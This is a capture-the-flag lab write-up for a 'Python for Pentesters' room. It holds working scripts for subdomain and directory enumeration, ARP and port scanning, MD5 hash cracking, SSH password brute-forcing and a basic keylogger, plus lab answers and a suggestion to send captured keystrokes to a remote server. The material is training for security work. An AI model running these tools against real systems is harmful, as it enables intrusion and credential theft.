# Python For Pentesters

|Try Hack Me! Lab Write-up | By: Herman Detwiler | 8/5/21

## 1) Introduction

This lab teaches us to

- Use Python to enumerate the target's subdomain
- Build a simple keylogger
- Scan the network to find target systems
- Scan any target to find the open ports
- Download files from the internet
- Crack hashes

The IP address provided for this lab was 10.10.77.160, after connecting to the vpn I set the ip to a variable in bash so I do not need to keep remebering it. The command for creating that variable in bash is:

`export ip=10.10.77.160`


## 2) Subdomain Enumeration
 
*Python gives us an easy way to automate tasks during a penetration test. Any tasks that you have to perform regularly are worth automating. While the automation process comes with a learning curve, the mid and long-term gains are worth it.*

*Finding subdomains used by the target organization is an effective way to increase the attack surface and discover more vulnerabilities.*

*The script will use a list of potential subdomains and prepends them to the domain name provided via a command-line argument.*

*The script then tries to connect to the subdomains and assumes the ones that accept the connection exist.*


  ```python
#!/bin/bash/env python3

#Subdomain Enumeration Script for THMs PY4PT2 lab
#Writen by: Herman Detwiler

import requests
import sys

#open and read our wordlist	
subdomain_list = open("wordlist.txt").read()

#Split that content by each line and put it into a variable
subdoms = subdomain_list.splitlines()

#check to see if there is command-line input	
if len(sys.argv) < 2:
    print("Please enter a domain") #if not we tell them this
    sys.exit(1) #and exit our program

#For every sub domain in our split sub domains then trys to make http requests combining our list and input
for sub in subdoms:
	sub_domains = f"http://{sub}.{sys.argv[1]}"
	try:
		requests.get(sub_domains)

	except requests.ConnectionError:
		pass
	else:
		print("Valid Domain", sub_domains) #If it finds one it prints out that it found one and the name of that subdomain.
```

## 3) Directory Enumeration

*As it is often pointed out, reconnaissance is one of the most critical steps to the success of a penetration testing engagement. Once subdomains have been discovered, the next step would be to find directories.*

*The following code will build a simple directory enumeration tool.*

```python
#!/usr/bin/env python3


import requests
import sys

#reading our wordlist and putting it into a variable

sub_list = open("wordlist.txt").read()

#splitting each line of the file into another viable

directories = sub_list.splitlines()


#creating a for loop to iterate through each line

for dir in directories:
	dir_enum = f"http://{sys.argv[1]}/{dir}.html" #use an f string to store each request url
	r=requests.get(dir_enum) #send current request
	if r.status_code==404: #if the page doesn't exist
		pass
	else:
		print("Valid directory:" ,dir_enum) #if it does print this and the directory name
```

Running this command against the box provided by this room:

```bash
└─$ ./directory_enumeration.py $ip       
Valid directory: http://10.10.77.160/surfer.html
Valid directory: http://10.10.77.160/private.html
Valid directory: http://10.10.77.160/apollo.html
Valid directory: http://10.10.77.160/index.html
```


### Questions

1.  How many directories can your script identify on the target system? (extensions are .html):`4`

2. What is the location of the login page?: `private.html`

3. Where did you find a cryptic hash?: `apollo.html`

4. Where are the usernames located?: `surger.html`

5. What is the password assigned to Rabbit?: `LOUSYRABBO`

## 4) Network Scanner

*Python can be used to build a simple ICMP (Internet Control Message Protocol) scanner to identify potential targets on the network. However, ICMP packets can be monitored or blocked as the target organization would not expect a regular user to “ping a server”. On the other hand, systems can be configured to not respond to ICMP requests. These are the main reasons why using the ARP (Address Resolution Protocol) to identify targets on the local network is more effective.*

```python
#!/usr/bin/env python3

from scapy.all import *

interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range)

ans,unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
	print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))
```

### Questions

1. What module was used to create the ARP request packets?:`scapy`
2. Which variable would you need to change according to your local IP block?: `ip_range`
3. What variable would you change to run this code on a system with the network interface named ens33?: `interface`

## Port Scanner

Simple port scanner example script:

```python
#!/usr/bin/env python3

import sys
import socket
import pyfiglet

ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \nPort Scanner")
print(ascii_banner)

ip = '10.10.68.91'
open_ports = []

ports = range(1, 65535)

def probe_port(ip, port, result = 1):
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(0.5)
		r = sock.connect_ex((ip, port))
		if r == 0:
			result = r
		sock.close()
	except Exception as e:
		pass
	return result

for port in ports:
	sys.stdout.flush()
	response = probe_port(ip, port)
	if response == 0:
		open_ports.append(port)

if open_ports:
	print("Open Ports are: ")
	print(sorted(open_ports))
else:
	print ("Looks like no ports are open :(")
```

### Questions

1. What protocol will most likely be using TCP port 22?: `ssh`
2. What module did we import to be able to use sockets?: `socket`
3. What function is likely to fail if we didn't import sys?: `sys.stdout.flush()`
4. How many ports are open on the target machine?: `3`
5. What is the highest port number open on the target system?: `2100`

## File Downloader

*Wget on Linux systems or Certutil on Windows are useful tools to download files.*

*Python can also be used for the same purpose.*

The code: 

```python
#!/usr/bin/env python3

import requests

url = 'https://assets.tryhackme.com/img/THMlogo.png'
r = requests.get(url, allow_redirects=True)
open('THMlogo.png', 'wb').write(r.content)
```
 This short piece of code can easily be adapted to retrieve any other type of file, as seen below: 

 ```python
#!/usr/bin/env python3

import requests

url = 'https://download.sysinternals.com/files/PSTools.zip'
r = requests.get(url, allow_redirects=True)
open('PSTools.zip', 'wb').write(r.content)
 ```

 *PSexec allow system administrators to run commands on remote Windows systems. We see that PSexec is also used in cyber attacks as it is usually not detected by antivirus software. You can learn more about PSexec [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) and read [this](https://www.praetorian.com/blog/threat-hunting-how-to-detect-psexec/) blogpost about its use by attackers.*

 ### Questions

1. What is the function used to connect to the target website?: `requests.get()`

2.  What step of the Unified Cyber Kill Chain can PSexec be used in?: `lateral movement`


## Hash Cracker

*A Hash is often used to safeguard passwords and other important data. As a penetration tester, you may need to find the cleartext value for several different hashes. The Hash library in Python allows you to build hash crackers according to your requirements quickly.*

*Hashlib is a powerful module that supports a wide range of algorithms.* 

```bash
└─$ python3 -c 'import hashlib;print(hashlib.algorithms_available)'
{'sha512_224', 'sha3_224', 'sha3_256', 'blake2s', 'sha224', 'sha512_256', 'shake_256', 'md4', 'whirlpool', 'sha512', 'sha3_512', 'shake_128', 'md5', 'ripemd160', 'sha1', 'sm3', 'sha256', 'sha3_384', 'blake2b', 'sha384', 'md5-sha1'}
```
*Leaving aside some of the more exotic ones you will see in the list above, hashlib will support most of the commonly used hashing algorithms.*

Code:

```python
#!/usr/bin/env python3

import hashlib
import pyfiglet

ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \n HASH CRACKER for MD 5")
print(ascii_banner)

wordlist_location = str(input('Enter wordlist file location: '))
hash_input = str(input('Enter hash to be cracked: '))

with open(wordlist_location, 'r') as file:
	for line in file.readline():
		hash_ob = hashlib.md5(line.strip().encode())
		hashed_pass = hash_ob.hexdiget()
		if hashed_pass == hash_input:
			print('Found cleartext Password! ' + line.strip())
			exit(0)
```

This script will require two inputs: the location of the wordlist and the hash value.

As you probably know, hash values can not be cracked as they do not contain the cleartext value. Unlike encrypted values that can be "reversed" (e.g. decrypted), cleartext values for hashes can only be found starting with a list of potential cleartext values. A simplified process can be seen below;

1. You retrieve the hash value "eccbc87e4b5ce2fe28308fd9f2a7baf3" from a database, which you suspect is the hash for a number between 1 and 5.
   
2. You create a file with possible cleartext values (numbers from 1 to 5)
    
3. You generate a list of hashes for values in the cleartext list (Hash values for numbers between 1 and 5)

4. You compare the generated hash with the hash value at hand (Matches hash value of the number 3)

5. Obviously, a more effective process can be designed, but the main principle will remain identical. 


The script below follows an approach close to the one described above;

1. Asks for the location of a wordlist
2. Asks for the hash to be cracked
3. Reads values from the wordlist (one per line)
4. Converts cleartext values to MD5 hash values
5. Compares the generated MD5 hash value with the value entered by the user

```
└─$ ./hash_cracker.py

Enter wordlist file location: wordlist.txt
Enter hash to be cracked: cd13b6a6af66fb774faa589a9d18f906
Found cleartext Password! rainbow
```


### Questions

1. What is the hash you found during directory enumeration?:
`cd13b6a6af66fb774faa589a9d18f906`

2. What is the cleartet value of this hash?: `rainbow`

3. modify the scripy to work with SHA256 hashes and find the cleartext for: 

5030c5bd002de8713fef5daebd597620f5e8bcea31c603dccdfcdf502a57cc60

`redwings`

## Keyloggers


Modules allow us to solve relatively difficult problems in a simple way.

A good example is the “keyboard” module, which allows us to interact with the keyboard.

If the “keyboard” module is not available on your system, we can use pip3 to install it.
pip3 install keyboard   

Using the keyboard module, the following three lines of code would be enough to record and replay keys pressed: 

```python
#!/usr/bin/env python3

import keyboard

keys = keyboard.record(until='ENTER')
keyboard.play(keys)

```

### Questions

1. What package installer was user?: `pip3`

2  What line in this code would you change to stop the result from being printed on the screen?: `keyboard.play(keys)`

## SSH Brute Forcing

The powerful Python language is supported by a number of modules that easily extend its capabilities. Paramiko is an SSHv2 implementation that will be useful in building SSH clients and servers.

The example below shows one way to build an SSH password brute force attack script. As is often the case in programming, there rarely is a single correct answer for these kinds of applications. As a penetration tester, your usage of programming languages will be different for developers. While they may care about best practices and code hygiene, your goal will more often be to end with a code that works as you want it to.

By now, you should be familiar with the "try" and "except" syntax. This script has one new feature, "def". "Def" allows us to create custom functions, as seen below.  The "ssh_connect" function is not native to Python but built using Paramiko and the "paramiko.SSHClient()" function. 

```python
#!/usr/bin/env python3

# Imports: We import modules we will use inside the script. As discussed earlier, we will need Paramiko to interact with the SSH server on the target system. "Sys" and "os" will provide us with the basic functionalities needed to read a file from the operating system (our password list in this case). As we are using Paramiko to communicate with the SSH server, we do not need to import "socket". 

import paramiko
import sys
import os


# Inputs  This block will request input from the user. An alternative way to do this would be to accept the user input directly from the command line as an argument using "sys.argv[]".

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

# SSH Connection: This section will create the "ssh_connect" function. Successful authentication will return a code 0, a failed authentication will return a code 1.

def ssh_connect(password, code=0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(target, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		code = 1
	ssh.close()
	return code


# Password list: We then open the password file supplied earlier by the user and take each line as a password to be tried.

with open(password_file, 'r') as file:
	for line in file.readlines():
		password = line.strip()


# Responses: The script tries to connect to the SSH server and decides on an output based on the response code. Please note the response code here is the one generated by Paramiko and not an HTTP response code. The script exits once it has found a valid password.


		try:
			response = ssh_connect(password)

			if response == 0:
				print('password found: ' + password)
				exit(0)
			elif response == 1:
				print('no luck')
		except Exception as e:
			print(e)
		pass

	input_file.close()

# As you will see, the scripts run slower than we would expect. To improve speed, you may want to look into threading this process.
```


### Questions

1.  What username starting with the letter "t" did you find earlier?: `tiffany`

2. What is the SSH password of this user?: `trustno1`

3. What is the content of the flag.txt file?: `THM-737390028`



## Extra challenges

Based on what we have covered in this room, here are a few suggestions about how you could expand these tools or start building your own using Python:

- Use DNS requests to enumerate potential subdomains
 
- Build the keylogger to send the capture keystrokes to a server you built using Python
    
- Grab the banner of services running on open ports

- Crawl the target website to download .js library files included
    
- Try to build a Windows executable for each and see if they work as stand-alone applications on a Windows target
    
- Implement threading in enumeration and brute-forcing scripts to make them run faster
